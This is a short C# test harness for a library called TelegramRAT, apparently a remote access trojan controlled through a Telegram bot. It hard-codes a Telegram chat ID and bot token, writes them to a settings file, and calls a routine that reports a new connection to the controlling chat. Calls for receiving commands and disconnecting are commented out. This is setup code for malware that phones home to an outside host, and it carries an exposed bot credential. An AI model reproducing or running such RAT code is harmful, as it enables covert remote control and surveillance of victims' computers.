using TelegramRAT;

namespace Test
{
    class Program
    {
        static void Main(string[] args)
        {
            config.TelegramChatID = "917143135";
            config.TelegramToken = "1884697004:AAFU0xLU9_4lapVVoToRq9w4OEGhvayyats";
            config.Save("settings.conf");
            config.Load("settings.conf");
            //telegram.ReplyKeyboardMarkup();
            telegram.sendConnection();
            //telegram.waitCommandsThread.Start();
            //telegram.sendDisconnection();
        }
    }
}
